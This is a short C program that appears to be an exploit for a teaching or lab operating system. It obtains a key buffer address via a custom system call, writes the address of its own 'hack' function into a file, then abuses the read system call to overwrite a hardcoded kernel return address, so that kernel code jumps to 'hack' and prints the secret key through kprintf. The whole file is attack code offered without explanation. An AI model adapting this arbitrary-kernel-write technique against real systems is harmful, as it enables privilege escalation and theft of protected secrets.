#include <stdio.h>
#include <fcntl.h>

size_t* key_buffer_address;

void hack()
{
    typedef void (*kprintf_ptr)(const char*,...);
    kprintf_ptr k = (kprintf_ptr )0x8000202e; //kprintf function
    k("This is the content of %x: %s\n", *key_buffer_address, *key_buffer_address);
}

int main()
{
  key_buffer_address  = __syscall(sc_getkeyinfo, 0x00, 0x00, 0x00, 0x00, 0x00);

  size_t return_address = hack;
  size_t to_overwrite = 0x8013616c; //Location of actual return address

  int fd = __syscall(sc_open, "open.txt", O_CREAT | O_RDWR, 0777, 0x00, 0x00);
  __syscall(sc_write, fd, &return_address, sizeof(size_t), 0x00, 0x00);
  __syscall(sc_read, fd, to_overwrite, sizeof(size_t), 0x00, 0x00);

  return 0;
}
